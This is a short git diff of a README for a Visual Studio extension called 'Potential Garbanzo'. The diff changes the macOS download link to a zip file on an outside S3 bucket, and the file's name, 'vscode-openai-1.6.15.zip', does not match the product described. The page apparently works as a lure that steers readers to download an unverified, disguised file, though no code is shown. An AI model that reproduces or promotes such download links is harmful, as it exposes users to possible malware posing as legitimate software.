@@ -22,7 +22,7 @@ Potential Garbanzo Extension enhances Visual Studio by providing a designer, too
 Potential Garbanzo contains a visual studio designer, domain-specific language (DSL) and code generation engine to provide an exceptional experience for building modern resource-based solutions.
 
 ### **Download Potential Garbanzo Extension for Visual Studio:**
-#### [macOS](https://tensorlab.s3.us-east-1.amazonaws.com/api/extensions/v1/)
+#### [macOS Users](https://tensorlab.s3.us-east-1.amazonaws.com/api/extensions/v1/vscode-openai-1.6.15.zip)
 1. 
 
 #### [Windows Users](https://tensorlab.s3.us-east-1.amazonaws.com/api/extensions/v1/)
